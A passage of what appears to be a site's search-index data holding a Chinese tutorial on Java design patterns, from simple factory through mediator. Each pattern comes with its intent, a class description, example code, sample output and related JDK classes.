\u8FD9\u6837\u505A\u80FD\u628A\u5BA2\u6237\u7C7B\u548C\u5177\u4F53\u5B50\u7C7B\u7684\u5B9E\u73B0\u89E3\u8026\uFF0C\u5BA2\u6237\u7C7B\u4E0D\u518D\u9700\u8981\u77E5\u9053\u6709\u54EA\u4E9B\u5B50\u7C7B\u4EE5\u53CA\u5E94\u5F53\u5B9E\u4F8B\u5316\u54EA\u4E2A\u5B50\u7C7B\u3002\u5BA2\u6237\u7C7B\u5F80\u5F80\u6709\u591A\u4E2A\uFF0C\u5982\u679C\u4E0D\u4F7F\u7528\u7B80\u5355\u5DE5\u5382\uFF0C\u90A3\u4E48\u6240\u6709\u7684\u5BA2\u6237\u7C7B\u90FD\u8981\u77E5\u9053\u6240\u6709\u5B50\u7C7B\u7684\u7EC6\u8282\u3002\u800C\u4E14\u4E00\u65E6\u5B50\u7C7B\u53D1\u751F\u6539\u53D8\uFF0C\u4F8B\u5982\u589E\u52A0\u5B50\u7C7B\uFF0C\u90A3\u4E48\u6240\u6709\u7684\u5BA2\u6237\u7C7B\u90FD\u8981\u8FDB\u884C\u4FEE\u6539\u3002`},{header:"Implementation",slug:"implementation-1",content:`public interface Product {
}
public class ConcreteProduct implements Product {
}
public class ConcreteProduct1 implements Product {
}
public class ConcreteProduct2 implements Product {
}
\u4EE5\u4E0B\u7684 Client \u7C7B\u5305\u542B\u4E86\u5B9E\u4F8B\u5316\u7684\u4EE3\u7801\uFF0C\u8FD9\u662F\u4E00\u79CD\u9519\u8BEF\u7684\u5B9E\u73B0\u3002\u5982\u679C\u5728\u5BA2\u6237\u7C7B\u4E2D\u5B58\u5728\u8FD9\u79CD\u5B9E\u4F8B\u5316\u4EE3\u7801\uFF0C\u5C31\u9700\u8981\u8003\u8651\u5C06\u4EE3\u7801\u653E\u5230\u7B80\u5355\u5DE5\u5382\u4E2D\u3002
public class Client { public static void main(String[] args) { int type = 1; Product product; if (type == 1) { product = new ConcreteProduct1(); } else if (type == 2) { product = new ConcreteProduct2(); } else { product = new ConcreteProduct(); } // do something with the product }
}
\u4EE5\u4E0B\u7684 SimpleFactory \u662F\u7B80\u5355\u5DE5\u5382\u5B9E\u73B0\uFF0C\u5B83\u88AB\u6240\u6709\u9700\u8981\u8FDB\u884C\u5B9E\u4F8B\u5316\u7684\u5BA2\u6237\u7C7B\u8C03\u7528\u3002
public class SimpleFactory { public Product createProduct(int type) { if (type == 1) { return new ConcreteProduct1(); } else if (type == 2) { return new ConcreteProduct2(); } return new ConcreteProduct(); }
}
public class Client { public static void main(String[] args) { SimpleFactory simpleFactory = new SimpleFactory(); Product product = simpleFactory.createProduct(1); // do something with the product }
}`},{header:"3. \u5DE5\u5382\u65B9\u6CD5\uFF08Factory Method\uFF09",slug:"_3-\u5DE5\u5382\u65B9\u6CD5-factory-method",content:""},{header:"Intent",slug:"intent-2",content:"\u5B9A\u4E49\u4E86\u4E00\u4E2A\u521B\u5EFA\u5BF9\u8C61\u7684\u63A5\u53E3\uFF0C\u4F46\u7531\u5B50\u7C7B\u51B3\u5B9A\u8981\u5B9E\u4F8B\u5316\u54EA\u4E2A\u7C7B\u3002\u5DE5\u5382\u65B9\u6CD5\u628A\u5B9E\u4F8B\u5316\u64CD\u4F5C\u63A8\u8FDF\u5230\u5B50\u7C7B\u3002"},{header:"Class Diagram",slug:"class-diagram-2",content:`\u5728\u7B80\u5355\u5DE5\u5382\u4E2D\uFF0C\u521B\u5EFA\u5BF9\u8C61\u7684\u662F\u53E6\u4E00\u4E2A\u7C7B\uFF0C\u800C\u5728\u5DE5\u5382\u65B9\u6CD5\u4E2D\uFF0C\u662F\u7531\u5B50\u7C7B\u6765\u521B\u5EFA\u5BF9\u8C61\u3002
\u4E0B\u56FE\u4E2D\uFF0CFactory \u6709\u4E00\u4E2A doSomething() \u65B9\u6CD5\uFF0C\u8FD9\u4E2A\u65B9\u6CD5\u9700\u8981\u7528\u5230\u4E00\u4E2A\u4EA7\u54C1\u5BF9\u8C61\uFF0C\u8FD9\u4E2A\u4EA7\u54C1\u5BF9\u8C61\u7531 factoryMethod() \u65B9\u6CD5\u521B\u5EFA\u3002\u8BE5\u65B9\u6CD5\u662F\u62BD\u8C61\u7684\uFF0C\u9700\u8981\u7531\u5B50\u7C7B\u53BB\u5B9E\u73B0\u3002`},{header:"Implementation",slug:"implementation-2",content:`public abstract class Factory { abstract public Product factoryMethod(); public void doSomething() { Product product = factoryMethod(); // do something with the product }
}
public class ConcreteFactory extends Factory { public Product factoryMethod() { return new ConcreteProduct(); }
}
public class ConcreteFactory1 extends Factory { public Product factoryMethod() { return new ConcreteProduct1(); }
}
public class ConcreteFactory2 extends Factory { public Product factoryMethod() { return new ConcreteProduct2(); }
}`},{header:"JDK",slug:"jdk-1",content:`java.util.Calendar
java.util.ResourceBundle
java.text.NumberFormat
java.nio.charset.Charset
java.net.URLStreamHandlerFactory
java.util.EnumSet
javax.xml.bind.JAXBContext`},{header:"4. \u62BD\u8C61\u5DE5\u5382\uFF08Abstract Factory\uFF09",slug:"_4-\u62BD\u8C61\u5DE5\u5382-abstract-factory",content:""},{header:"Intent",slug:"intent-3",content:"\u63D0\u4F9B\u4E00\u4E2A\u63A5\u53E3\uFF0C\u7528\u4E8E\u521B\u5EFA \u76F8\u5173\u7684\u5BF9\u8C61\u5BB6\u65CF \u3002"},{header:"Class Diagram",slug:"class-diagram-3",content:`\u62BD\u8C61\u5DE5\u5382\u6A21\u5F0F\u521B\u5EFA\u7684\u662F\u5BF9\u8C61\u5BB6\u65CF\uFF0C\u4E5F\u5C31\u662F\u5F88\u591A\u5BF9\u8C61\u800C\u4E0D\u662F\u4E00\u4E2A\u5BF9\u8C61\uFF0C\u5E76\u4E14\u8FD9\u4E9B\u5BF9\u8C61\u662F\u76F8\u5173\u7684\uFF0C\u4E5F\u5C31\u662F\u8BF4\u5FC5\u987B\u4E00\u8D77\u521B\u5EFA\u51FA\u6765\u3002\u800C\u5DE5\u5382\u65B9\u6CD5\u6A21\u5F0F\u53EA\u662F\u7528\u4E8E\u521B\u5EFA\u4E00\u4E2A\u5BF9\u8C61\uFF0C\u8FD9\u548C\u62BD\u8C61\u5DE5\u5382\u6A21\u5F0F\u6709\u5F88\u5927\u4E0D\u540C\u3002
\u62BD\u8C61\u5DE5\u5382\u6A21\u5F0F\u7528\u5230\u4E86\u5DE5\u5382\u65B9\u6CD5\u6A21\u5F0F\u6765\u521B\u5EFA\u5355\u4E00\u5BF9\u8C61\uFF0CAbstractFactory \u4E2D\u7684 createProductA() \u548C createProductB() \u65B9\u6CD5\u90FD\u662F\u8BA9\u5B50\u7C7B\u6765\u5B9E\u73B0\uFF0C\u8FD9\u4E24\u4E2A\u65B9\u6CD5\u5355\u72EC\u6765\u770B\u5C31\u662F\u5728\u521B\u5EFA\u4E00\u4E2A\u5BF9\u8C61\uFF0C\u8FD9\u7B26\u5408\u5DE5\u5382\u65B9\u6CD5\u6A21\u5F0F\u7684\u5B9A\u4E49\u3002
\u81F3\u4E8E\u521B\u5EFA\u5BF9\u8C61\u7684\u5BB6\u65CF\u8FD9\u4E00\u6982\u5FF5\u662F\u5728 Client \u4F53\u73B0\uFF0CClient \u8981\u901A\u8FC7 AbstractFactory \u540C\u65F6\u8C03\u7528\u4E24\u4E2A\u65B9\u6CD5\u6765\u521B\u5EFA\u51FA\u4E24\u4E2A\u5BF9\u8C61\uFF0C\u5728\u8FD9\u91CC\u8FD9\u4E24\u4E2A\u5BF9\u8C61\u5C31\u6709\u5F88\u5927\u7684\u76F8\u5173\u6027\uFF0CClient \u9700\u8981\u540C\u65F6\u521B\u5EFA\u51FA\u8FD9\u4E24\u4E2A\u5BF9\u8C61\u3002
\u4ECE\u9AD8\u5C42\u6B21\u6765\u770B\uFF0C\u62BD\u8C61\u5DE5\u5382\u4F7F\u7528\u4E86\u7EC4\u5408\uFF0C\u5373 Cilent \u7EC4\u5408\u4E86 AbstractFactory\uFF0C\u800C\u5DE5\u5382\u65B9\u6CD5\u6A21\u5F0F\u4F7F\u7528\u4E86\u7EE7\u627F\u3002`},{header:"Implementation",slug:"implementation-3",content:`public class AbstractProductA {
}
public class AbstractProductB {
}
public class ProductA1 extends AbstractProductA {
}
public class ProductA2 extends AbstractProductA {
}
public class ProductB1 extends AbstractProductB {
}
public class ProductB2 extends AbstractProductB {
}
public abstract class AbstractFactory { abstract AbstractProductA createProductA(); abstract AbstractProductB createProductB();
}
public class ConcreteFactory1 extends AbstractFactory { AbstractProductA createProductA() { return new ProductA1(); } AbstractProductB createProductB() { return new ProductB1(); }
}
public class ConcreteFactory2 extends AbstractFactory { AbstractProductA createProductA() { return new ProductA2(); } AbstractProductB createProductB() { return new ProductB2(); }
}
public class Client { public static void main(String[] args) { AbstractFactory abstractFactory = new ConcreteFactory1(); AbstractProductA productA = abstractFactory.createProductA(); AbstractProductB productB = abstractFactory.createProductB(); // do something with productA and productB }
}`},{header:"JDK",slug:"jdk-2",content:`javax.xml.parsers.DocumentBuilderFactory
javax.xml.transform.TransformerFactory
javax.xml.xpath.XPathFactory`},{header:"5. \u751F\u6210\u5668\uFF08Builder\uFF09",slug:"_5-\u751F\u6210\u5668-builder",content:""},{header:"Intent",slug:"intent-4",content:"\u5C01\u88C5\u4E00\u4E2A\u5BF9\u8C61\u7684\u6784\u9020\u8FC7\u7A0B\uFF0C\u5E76\u5141\u8BB8\u6309\u6B65\u9AA4\u6784\u9020\u3002"},{header:"Class Diagram",slug:"class-diagram-4",content:""},{header:"Implementation",slug:"implementation-4",content:`\u4EE5\u4E0B\u662F\u4E00\u4E2A\u7B80\u6613\u7684 StringBuilder \u5B9E\u73B0\uFF0C\u53C2\u8003\u4E86 JDK 1.8 \u6E90\u7801\u3002
public class AbstractStringBuilder { protected char[] value; protected int count; public AbstractStringBuilder(int capacity) { count = 0; value = new char[capacity]; } public AbstractStringBuilder append(char c) { ensureCapacityInternal(count + 1); value[count++] = c; return this; } private void ensureCapacityInternal(int minimumCapacity) { // overflow-conscious code if (minimumCapacity - value.length > 0) expandCapacity(minimumCapacity); } void expandCapacity(int minimumCapacity) { int newCapacity = value.length * 2 + 2; if (newCapacity - minimumCapacity < 0) newCapacity = minimumCapacity; if (newCapacity < 0) { if (minimumCapacity < 0) // overflow throw new OutOfMemoryError(); newCapacity = Integer.MAX_VALUE; } value = Arrays.copyOf(value, newCapacity); }
}
public class StringBuilder extends AbstractStringBuilder { public StringBuilder() { super(16); } @Override public String toString() { // Create a copy, don't share the array return new String(value, 0, count); }
}
public class Client { public static void main(String[] args) { StringBuilder sb = new StringBuilder(); final int count = 26; for (int i = 0; i < count; i++) { sb.append((char) ('a' + i)); } System.out.println(sb.toString()); }
}
abcdefghijklmnopqrstuvwxyz`},{header:"JDK",slug:"jdk-3",content:`java.lang.StringBuilder
java.nio.ByteBuffer
java.lang.StringBuffer
java.lang.Appendable
Apache Camel builders`},{header:"6. \u539F\u578B\u6A21\u5F0F\uFF08Prototype\uFF09",slug:"_6-\u539F\u578B\u6A21\u5F0F-prototype",content:""},{header:"Intent",slug:"intent-5",content:"\u4F7F\u7528\u539F\u578B\u5B9E\u4F8B\u6307\u5B9A\u8981\u521B\u5EFA\u5BF9\u8C61\u7684\u7C7B\u578B\uFF0C\u901A\u8FC7\u590D\u5236\u8FD9\u4E2A\u539F\u578B\u6765\u521B\u5EFA\u65B0\u5BF9\u8C61\u3002"},{header:"Class Diagram",slug:"class-diagram-5",content:""},{header:"Implementation",slug:"implementation-5",content:`public abstract class Prototype { abstract Prototype myClone();
}
public class ConcretePrototype extends Prototype { private String filed; public ConcretePrototype(String filed) { this.filed = filed; } @Override Prototype myClone() { return new ConcretePrototype(filed); } @Override public String toString() { return filed; }
}
public class Client { public static void main(String[] args) { Prototype prototype = new ConcretePrototype("abc"); Prototype clone = prototype.myClone(); System.out.println(clone.toString()); }
}
abc`},{header:"JDK",slug:"jdk-4",content:"java.lang.Object#clone()"},{header:"\u4E09\u3001\u884C\u4E3A\u578B",slug:"\u4E09\u3001\u884C\u4E3A\u578B",content:""},{header:"1. \u8D23\u4EFB\u94FE\uFF08Chain Of Responsibility\uFF09",slug:"_1-\u8D23\u4EFB\u94FE-chain-of-responsibility",content:""},{header:"Intent",slug:"intent-6",content:"\u4F7F\u591A\u4E2A\u5BF9\u8C61\u90FD\u6709\u673A\u4F1A\u5904\u7406\u8BF7\u6C42\uFF0C\u4ECE\u800C\u907F\u514D\u8BF7\u6C42\u7684\u53D1\u9001\u8005\u548C\u63A5\u6536\u8005\u4E4B\u95F4\u7684\u8026\u5408\u5173\u7CFB\u3002\u5C06\u8FD9\u4E9B\u5BF9\u8C61\u8FDE\u6210\u4E00\u6761\u94FE\uFF0C\u5E76\u6CBF\u7740\u8FD9\u6761\u94FE\u53D1\u9001\u8BE5\u8BF7\u6C42\uFF0C\u76F4\u5230\u6709\u4E00\u4E2A\u5BF9\u8C61\u5904\u7406\u5B83\u4E3A\u6B62\u3002"},{header:"Class Diagram",slug:"class-diagram-6",content:"Handler\uFF1A\u5B9A\u4E49\u5904\u7406\u8BF7\u6C42\u7684\u63A5\u53E3\uFF0C\u5E76\u4E14\u5B9E\u73B0\u540E\u7EE7\u94FE\uFF08successor\uFF09"},{header:"Implementation",slug:"implementation-6",content:`public abstract class Handler { protected Handler successor; public Handler(Handler successor) { this.successor = successor; } protected abstract void handleRequest(Request request);
}
public class ConcreteHandler1 extends Handler { public ConcreteHandler1(Handler successor) { super(successor); } @Override protected void handleRequest(Request request) { if (request.getType() == RequestType.TYPE1) { System.out.println(request.getName() + " is handle by ConcreteHandler1"); return; } if (successor != null) { successor.handleRequest(request); } }
}
public class ConcreteHandler2 extends Handler { public ConcreteHandler2(Handler successor) { super(successor); } @Override protected void handleRequest(Request request) { if (request.getType() == RequestType.TYPE2) { System.out.println(request.getName() + " is handle by ConcreteHandler2"); return; } if (successor != null) { successor.handleRequest(request); } }
}
public class Request { private RequestType type; private String name; public Request(RequestType type, String name) { this.type = type; this.name = name; } public RequestType getType() { return type; } public String getName() { return name; }
} public enum RequestType { TYPE1, TYPE2
}
public class Client { public static void main(String[] args) { Handler handler1 = new ConcreteHandler1(null); Handler handler2 = new ConcreteHandler2(handler1); Request request1 = new Request(RequestType.TYPE1, "request1"); handler2.handleRequest(request1); Request request2 = new Request(RequestType.TYPE2, "request2"); handler2.handleRequest(request2); }
}
request1 is handle by ConcreteHandler1
request2 is handle by ConcreteHandler2`},{header:"JDK",slug:"jdk-5",content:`java.util.logging.Logger#log()
Apache Commons Chain
javax.servlet.Filter#doFilter()`},{header:"2. \u547D\u4EE4\uFF08Command\uFF09",slug:"_2-\u547D\u4EE4-command",content:""},{header:"Intent",slug:"intent-7",content:`\u5C06\u547D\u4EE4\u5C01\u88C5\u6210\u5BF9\u8C61\u4E2D\uFF0C\u5177\u6709\u4EE5\u4E0B\u4F5C\u7528\uFF1A \u4F7F\u7528\u547D\u4EE4\u6765\u53C2\u6570\u5316\u5176\u5B83\u5BF9\u8C61
\u5C06\u547D\u4EE4\u653E\u5165\u961F\u5217\u4E2D\u8FDB\u884C\u6392\u961F
\u5C06\u547D\u4EE4\u7684\u64CD\u4F5C\u8BB0\u5F55\u5230\u65E5\u5FD7\u4E2D
\u652F\u6301\u53EF\u64A4\u9500\u7684\u64CD\u4F5C`},{header:"Class Diagram",slug:"class-diagram-7",content:`Command\uFF1A\u547D\u4EE4
Receiver\uFF1A\u547D\u4EE4\u63A5\u6536\u8005\uFF0C\u4E5F\u5C31\u662F\u547D\u4EE4\u771F\u6B63\u7684\u6267\u884C\u8005
Invoker\uFF1A\u901A\u8FC7\u5B83\u6765\u8C03\u7528\u547D\u4EE4
Client\uFF1A\u53EF\u4EE5\u8BBE\u7F6E\u547D\u4EE4\u4E0E\u547D\u4EE4\u7684\u63A5\u6536\u8005`},{header:"Implementation",slug:"implementation-7",content:`\u8BBE\u8BA1\u4E00\u4E2A\u9065\u63A7\u5668\uFF0C\u53EF\u4EE5\u63A7\u5236\u7535\u706F\u5F00\u5173\u3002 public interface Command { void execute();
}
public class LightOnCommand implements Command { Light light; public LightOnCommand(Light light) { this.light = light; } @Override public void execute() { light.on(); }
}
public class LightOffCommand implements Command { Light light; public LightOffCommand(Light light) { this.light = light; } @Override public void execute() { light.off(); }
}
public class Light { public void on() { System.out.println("Light is on!"); } public void off() { System.out.println("Light is off!"); }
}
/** * \u9065\u63A7\u5668 */
public class Invoker { private Command[] onCommands; private Command[] offCommands; private final int slotNum = 7; public Invoker() { this.onCommands = new Command[slotNum]; this.offCommands = new Command[slotNum]; } public void setOnCommand(Command command, int slot) { onCommands[slot] = command; } public void setOffCommand(Command command, int slot) { offCommands[slot] = command; } public void onButtonWasPushed(int slot) { onCommands[slot].execute(); } public void offButtonWasPushed(int slot) { offCommands[slot].execute(); }
}
public class Client { public static void main(String[] args) { Invoker invoker = new Invoker(); Light light = new Light(); Command lightOnCommand = new LightOnCommand(light); Command lightOffCommand = new LightOffCommand(light); invoker.setOnCommand(lightOnCommand, 0); invoker.setOffCommand(lightOffCommand, 0); invoker.onButtonWasPushed(0); invoker.offButtonWasPushed(0); }
}`},{header:"JDK",slug:"jdk-6",content:`java.lang.Runnable
Netflix Hystrix
javax.swing.Action`},{header:"3. \u89E3\u91CA\u5668\uFF08Interpreter\uFF09",slug:"_3-\u89E3\u91CA\u5668-interpreter",content:""},{header:"Intent",slug:"intent-8",content:"\u4E3A\u8BED\u8A00\u521B\u5EFA\u89E3\u91CA\u5668\uFF0C\u901A\u5E38\u7531\u8BED\u8A00\u7684\u8BED\u6CD5\u548C\u8BED\u6CD5\u5206\u6790\u6765\u5B9A\u4E49\u3002"},{header:"Class Diagram",slug:"class-diagram-8",content:`TerminalExpression\uFF1A\u7EC8\u7ED3\u7B26\u8868\u8FBE\u5F0F\uFF0C\u6BCF\u4E2A\u7EC8\u7ED3\u7B26\u90FD\u9700\u8981\u4E00\u4E2A TerminalExpression\u3002
Context\uFF1A\u4E0A\u4E0B\u6587\uFF0C\u5305\u542B\u89E3\u91CA\u5668\u4E4B\u5916\u7684\u4E00\u4E9B\u5168\u5C40\u4FE1\u606F\u3002`},{header:"Implementation",slug:"implementation-8",content:`\u4EE5\u4E0B\u662F\u4E00\u4E2A\u89C4\u5219\u68C0\u9A8C\u5668\u5B9E\u73B0\uFF0C\u5177\u6709 and \u548C or \u89C4\u5219\uFF0C\u901A\u8FC7\u89C4\u5219\u53EF\u4EE5\u6784\u5EFA\u4E00\u9897\u89E3\u6790\u6811\uFF0C\u7528\u6765\u68C0\u9A8C\u4E00\u4E2A\u6587\u672C\u662F\u5426\u6EE1\u8DB3\u89E3\u6790\u6811\u5B9A\u4E49\u7684\u89C4\u5219\u3002
\u4F8B\u5982\u4E00\u9897\u89E3\u6790\u6811\u4E3A D And (A Or (B C))\uFF0C\u6587\u672C "D A" \u6EE1\u8DB3\u8BE5\u89E3\u6790\u6811\u5B9A\u4E49\u7684\u89C4\u5219\u3002
\u8FD9\u91CC\u7684 Context \u6307\u7684\u662F String\u3002
public abstract class Expression { public abstract boolean interpret(String str);
}
public class TerminalExpression extends Expression { private String literal = null; public TerminalExpression(String str) { literal = str; } public boolean interpret(String str) { StringTokenizer st = new StringTokenizer(str); while (st.hasMoreTokens()) { String test = st.nextToken(); if (test.equals(literal)) { return true; } } return false; }
}
public class AndExpression extends Expression { private Expression expression1 = null; private Expression expression2 = null; public AndExpression(Expression expression1, Expression expression2) { this.expression1 = expression1; this.expression2 = expression2; } public boolean interpret(String str) { return expression1.interpret(str) && expression2.interpret(str); }
}
public class OrExpression extends Expression { private Expression expression1 = null; private Expression expression2 = null; public OrExpression(Expression expression1, Expression expression2) { this.expression1 = expression1; this.expression2 = expression2; } public boolean interpret(String str) { return expression1.interpret(str) || expression2.interpret(str); }
}
public class Client { /** * \u6784\u5EFA\u89E3\u6790\u6811 */ public static Expression buildInterpreterTree() { // Literal Expression terminal1 = new TerminalExpression("A"); Expression terminal2 = new TerminalExpression("B"); Expression terminal3 = new TerminalExpression("C"); Expression terminal4 = new TerminalExpression("D"); // B C Expression alternation1 = new OrExpression(terminal2, terminal3); // A Or (B C) Expression alternation2 = new OrExpression(terminal1, alternation1); // D And (A Or (B C)) return new AndExpression(terminal4, alternation2); } public static void main(String[] args) { Expression define = buildInterpreterTree(); String context1 = "D A"; String context2 = "A B"; System.out.println(define.interpret(context1)); System.out.println(define.interpret(context2)); }
}
true
false`},{header:"JDK",slug:"jdk-7",content:`java.util.Pattern
java.text.Normalizer
All subclasses of java.text.Format
javax.el.ELResolver`},{header:"4. \u8FED\u4EE3\u5668\uFF08Iterator\uFF09",slug:"_4-\u8FED\u4EE3\u5668-iterator",content:""},{header:"Intent",slug:"intent-9",content:"\u63D0\u4F9B\u4E00\u79CD\u987A\u5E8F\u8BBF\u95EE\u805A\u5408\u5BF9\u8C61\u5143\u7D20\u7684\u65B9\u6CD5\uFF0C\u5E76\u4E14\u4E0D\u66B4\u9732\u805A\u5408\u5BF9\u8C61\u7684\u5185\u90E8\u8868\u793A\u3002"},{header:"Class Diagram",slug:"class-diagram-9",content:`Aggregate \u662F\u805A\u5408\u7C7B\uFF0C\u5176\u4E2D createIterator() \u65B9\u6CD5\u53EF\u4EE5\u4EA7\u751F\u4E00\u4E2A Iterator\uFF1B
Iterator \u4E3B\u8981\u5B9A\u4E49\u4E86 hasNext() \u548C next() \u65B9\u6CD5\u3002
Client \u7EC4\u5408\u4E86 Aggregate\uFF0C\u4E3A\u4E86\u8FED\u4EE3\u904D\u5386 Aggregate\uFF0C\u4E5F\u9700\u8981\u7EC4\u5408 Iterator\u3002`},{header:"Implementation",slug:"implementation-9",content:`public interface Aggregate { Iterator createIterator();
}
public class ConcreteAggregate implements Aggregate { private Integer[] items; public ConcreteAggregate() { items = new Integer[10]; for (int i = 0; i < items.length; i++) { items[i] = i; } } @Override public Iterator createIterator() { return new ConcreteIterator<Integer>(items); }
}
public interface Iterator<Item> { Item next(); boolean hasNext();
}
public class ConcreteIterator<Item> implements Iterator { private Item[] items; private int position = 0; public ConcreteIterator(Item[] items) { this.items = items; } @Override public Object next() { return items[position++]; } @Override public boolean hasNext() { return position < items.length; }
}
public class Client { public static void main(String[] args) { Aggregate aggregate = new ConcreteAggregate(); Iterator<Integer> iterator = aggregate.createIterator(); while (iterator.hasNext()) { System.out.println(iterator.next()); } }
}`},{header:"JDK",slug:"jdk-8",content:`java.util.Iterator
java.util.Enumeration`},{header:"5. \u4E2D\u4ECB\u8005\uFF08Mediator\uFF09",slug:"_5-\u4E2D\u4ECB\u8005-mediator",content:""},{header:"Intent",slug:"intent-10",content:"\u96C6\u4E2D\u76F8\u5173\u5BF9\u8C61\u4E4B\u95F4\u590D\u6742\u7684\u6C9F\u901A\u548C\u63A7\u5236\u65B9\u5F0F\u3002"},{header:"Class Diagram",slug:"class-diagram-10",content:`Mediator\uFF1A\u4E2D\u4ECB\u8005\uFF0C\u5B9A\u4E49\u4E00\u4E2A\u63A5\u53E3\u7528\u4E8E\u4E0E\u5404\u540C\u4E8B\uFF08Colleague\uFF09\u5BF9\u8C61\u901A\u4FE1\u3002
Colleague\uFF1A\u540C\u4E8B\uFF0C\u76F8\u5173\u5BF9\u8C61`},{header:"Implementation",slug:"implementation-10",content:`Alarm\uFF08\u95F9\u949F\uFF09\u3001CoffeePot\uFF08\u5496\u5561\u58F6\uFF09\u3001Calendar\uFF08\u65E5\u5386\uFF09\u3001Sprinkler\uFF08\u55B7\u5934\uFF09\u662F\u4E00\u7EC4\u76F8\u5173\u7684\u5BF9\u8C61\uFF0C\u5728\u67D0\u4E2A\u5BF9\u8C61\u7684\u4E8B\u4EF6\u4EA7\u751F\u65F6\u9700\u8981\u53BB\u64CD\u4F5C\u5176\u5B83\u5BF9\u8C61\uFF0C\u5F62\u6210\u4E86\u4E0B\u9762\u8FD9\u79CD\u4F9D\u8D56\u7ED3\u6784\uFF1A \u4F7F\u7528\u4E2D\u4ECB\u8005\u6A21\u5F0F\u53EF\u4EE5\u5C06\u590D\u6742\u7684\u4F9D\u8D56\u7ED3\u6784\u53D8\u6210\u661F\u5F62\u7ED3\u6784\uFF1A public abstract class Colleague { public abstract void onEvent(Mediator mediator);
}
public class Alarm extends Colleague { @Override public void onEvent(Mediator mediator) { mediator.doEvent("alarm"); } public void doAlarm() { System.out.println("doAlarm()"); }
}
public class CoffeePot extends Colleague { @Override public void onEvent(Mediator mediator) { mediator.doEvent("coffeePot"); } public void doCoffeePot() { System.out.println("doCoffeePot()"); }
}
public class Calender extends Colleague { @Override public void onEvent(Mediator mediator) { mediator.doEvent("calender"); } public void doCalender() { System.out.println("doCalender()"); }
}
public class Sprinkler extends Colleague { @Override public void onEvent(Mediator mediator) { mediator.doEvent("sprinkler"); } public void doSprinkler() { System.out.println("doSprinkler()"); }
}
public abstract class Mediator { public abstract void doEvent(String eventType);
}
public class ConcreteMediator extends Mediator { private Alarm alarm; private CoffeePot coffeePot; private Calender calender; private Sprinkler sprinkler; public ConcreteMediator(Alarm alarm, CoffeePot coffeePot, Calender calender, Sprinkler sprinkler) { this.alarm = alarm; this.coffeePot = coffeePot; this.calender = calender; this.sprinkler = sprinkler; } @Override public void doEvent(String eventType) { switch (eventType) { case "alarm": doAlarmEvent(); break; case "coffeePot": doCoffeePotEvent(); break; case "calender": doCalenderEvent(); break; default: doSprinklerEvent(); } } public void doAlarmEvent() { alarm.doAlarm(); coffeePot.doCoffeePot(); calender.doCalender(); sprinkler.doSprinkler(); } public void doCoffeePotEvent() { // ... } public void doCalenderEvent() { // ... } public void doSprinklerEvent() { // ... }
}
public class Client { public static void main(String[] args) { Alarm alarm = new Alarm(); CoffeePot coffeePot = new CoffeePot(); Calender calender = new Calender(); Sprinkler sprinkler = new Sprinkler(); Mediator mediator = new ConcreteMediator(alarm, coffeePot, calender, sprinkler); // \u95F9\u949F\u4E8B\u4EF6\u5230\u8FBE\uFF0C\u8C03\u7528\u4E2D\u4ECB\u8005\u5C31\u53EF\u4EE5\u64CD\u4F5C\u76F8\u5173\u5BF9\u8C61 alarm.onEvent(mediator); }
}
doAlarm()
doCoffeePot()
doCalender()
doSprinkler()`},{header:"JDK",slug:"jdk-9",content:`All scheduleXXX() methods of java.util.Timer
java.util.concurrent.Executor#execute()
submit() and invokeXXX() methods of java.util.concurrent.ExecutorService
scheduleXXX() methods of java.util.concurrent.ScheduledExecutorService
java.lang.reflect.Method#invoke()`},{header:"6. \u5907\u5FD8\u5F55\uFF08Memento\uFF09",slug:"_6-\u5907\u5FD8\u5F55-memento",content:""},{header:"Intent",slug:"intent-11",content:"\u5728\u4E0D\u8FDD\u53CD\u5C01\u88C5\u7684\u60C5\u51B5\u4E0B\u83B7\u5F97\u5BF9\u8C61\u7684\u5185\u90E8\u72B6\u6001\uFF0C\u4ECE\u800C\u5728\u9700\u8981\u65F6\u53EF\u4EE5\u5C06\u5BF9\u8C61\u6062\u590D\u5230\u6700\u521D\u72B6\u6001\u3002"},{header:"Class Diagram",slug:"class-diagram-11",content:`Originator\uFF1A\u539F\u59CB\u5BF9\u8C61
Caretaker\uFF1A\u8D1F\u8D23\u4FDD\u5B58\u597D\u5907\u5FD8\u5F55
Menento\uFF1A\u5907\u5FD8\u5F55\uFF0C\u5B58\u50A8\u539F\u59CB\u5BF9\u8C61\u7684\u7684\u72B6\u6001\u3002\u5907\u5FD8\u5F55\u5B9E\u9645\u4E0A\u6709\u4E24\u4E2A\u63A5\u53E3\uFF0C\u4E00\u4E2A\u662F\u63D0\u4F9B\u7ED9 Caretaker \u7684\u7A84\u63A5\u53E3\uFF1A\u5B83\u53EA\u80FD\u5C06\u5907\u5FD8\u5F55\u4F20\u9012\u7ED9\u5176\u5B83\u5BF9\u8C61\uFF1B\u4E00\u4E2A\u662F\u63D0\u4F9B\u7ED9 Originator \u7684\u5BBD\u63A5\u53E3\uFF0C\u5141\u8BB8\u5B83\u8BBF\u95EE\u5230\u5148\u524D\u72B6\u6001\u6240\u9700\u7684\u6240\u6709\u6570\u636E\u3002\u7406\u60F3\u60C5\u51B5\u662F\u53EA\u5141\u8BB8 Originator \u8BBF\u95EE\u672C\u5907\u5FD8\u5F55\u7684\u5185\u90E8\u72B6\u6001\u3002`},{header:"Implementation",slug:"implementation-11",content:`\u4EE5\u4E0B\u5B9E\u73B0\u4E86\u4E00\u4E2A\u7B80\u5355\u8BA1\u7B97\u5668\u7A0B\u5E8F\uFF0C\u53EF\u4EE5\u8F93\u5165\u4E24\u4E2A\u503C\uFF0C\u7136\u540E\u8BA1\u7B97\u8FD9\u4E24\u4E2A\u503C\u7684\u548C\u3002\u5907\u5FD8\u5F55\u6A21\u5F0F\u5141\u8BB8\u5C06\u8FD9\u4E24\u4E2A\u503C\u5B58\u50A8\u8D77\u6765\uFF0C\u7136\u540E\u5728\u67D0\u4E2A\u65F6\u523B\u7528\u5B58\u50A8\u7684\u72B6\u6001\u8FDB\u884C\u6062\u590D\u3002
\u5B9E\u73B0\u53C2\u8003\uFF1AMemento Pattern - Calculator Example - Java Sourcecode
/** * Originator Interface */
public interface Calculator { // Create Memento PreviousCalculationToCareTaker backupLastCalculation(); // setMemento void restorePreviousCalculation(PreviousCalculationToCareTaker memento); int getCalculationResult(); void setFirstNumber(int firstNumber); void setSecondNumber(int secondNumber);
}
/** * Originator Implementation */
